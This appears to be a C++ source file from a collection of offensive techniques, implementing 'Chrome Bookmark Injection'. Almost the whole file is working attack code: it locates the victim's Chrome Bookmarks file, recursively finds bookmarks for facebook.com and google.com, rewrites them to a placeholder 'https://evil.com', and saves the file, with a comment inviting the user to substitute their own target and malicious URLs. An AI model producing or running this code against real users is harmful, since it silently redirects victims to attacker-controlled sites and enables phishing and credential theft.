/*
Title: Chrome Bookmark Injection
Description: This technique replaces the bookmark URLs with another one.
Notes:
	- Before executing the program, the Chrome browser may need to be closed because the browser may overwrite the bookmark info with the session states when the browser closes.
*/
#include <Windows.h>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include "nlohmann/json.hpp"

using json = nlohmann::json;

VOID InjectURL(json& bookmark, const std::vector<std::string>& targetURLs, const std::string& evilURL) {
	std::string url = bookmark["url"];
	for (auto& targetURL : targetURLs) {
		if (url.rfind(targetURL, 0) == 0) {
			bookmark["url"] = evilURL;
		}
	}
}

VOID ScanBookmarks(json& bookmark, const std::vector<std::string>& targetURLs, const std::string& evilURL) {
	if (bookmark["type"] == "url") {
		InjectURL(bookmark, targetURLs, evilURL);
	}
	else if (bookmark["type"] == "folder") {
		for (json& b : bookmark["children"]) {
			ScanBookmarks(b, targetURLs, evilURL);
		}
	}
}

BOOL ChromeBookmarkInjection() {
	// Replace the folloiwng values with your preferred ones.
	std::vector<std::string> targetURLs = {
		"https://facebook.com",
		"https://www.facebook.com",
		"https://www.google.com",
		"https://google.com"
	};
	std::string evilURL = "https://evil.com";

	// Get the Chrome bookmark file path.
	char* localAppDataPath;
	size_t len;
	errno_t err = _dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA");
	if (err) {
		char errorMessage[256];
		strerror_s(errorMessage, sizeof(errorMessage), err);
		printf("Error getting the environment variable: %s\n", errorMessage);
	}
	std::string bookmarkPath = std::string(localAppDataPath) + "\\Google\\Chrome\\User Data\\Default\\Bookmarks";

	// Open the bookmark file.
	std::ifstream inputFile(bookmarkPath);
	if (!inputFile.is_open()) {
		printf("Error opening the bookmark path: %s\n", bookmarkPath.c_str());
		return FALSE;
	}

	// Read JSON
	json bookmarks;
	inputFile >> bookmarks;
	inputFile.close();

	// Replace bookmark URLs.
	for (json& bookmark : bookmarks["roots"]["bookmark_bar"]["children"]) {
		ScanBookmarks(bookmark, targetURLs, evilURL);
	}

	// Save
	std::ofstream outputFile(bookmarkPath);
	outputFile << bookmarks.dump(4); // indent: 4
	outputFile.close();

	return TRUE;
}
